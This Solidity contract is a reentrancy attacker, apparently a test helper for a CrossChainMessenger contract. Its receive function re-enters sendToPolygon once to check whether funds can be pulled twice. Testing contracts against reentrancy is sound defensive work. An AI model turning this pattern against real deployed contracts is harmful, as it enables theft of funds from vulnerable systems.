// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "../CrossChainMessenger.sol";

contract ReentrancyAttacker {
    CrossChainMessenger public messenger;
    uint256 public attackCount;
    uint256 public constant ATTACK_VALUE = 1 ether;

    event AttackAttempted(uint256 value, uint256 count);

    constructor(address payable _messenger) {
        require(_messenger != address(0), "Invalid messenger address");
        messenger = CrossChainMessenger(_messenger);
    }

    function attack() external payable {
        require(msg.value >= ATTACK_VALUE, "Need at least 1 ETH");
        attackCount = 0;
        // Initial call to trigger reentrancy
        messenger.sendToPolygon{value: ATTACK_VALUE}(address(this));
    }

    // Receive function that attempts immediate reentry
    receive() external payable {
        if (attackCount == 0) {
            attackCount++;
            emit AttackAttempted(address(this).balance, attackCount);
            // Immediate reentrant call attempt
            messenger.sendToPolygon{value: ATTACK_VALUE}(address(this));
        }
    }
}
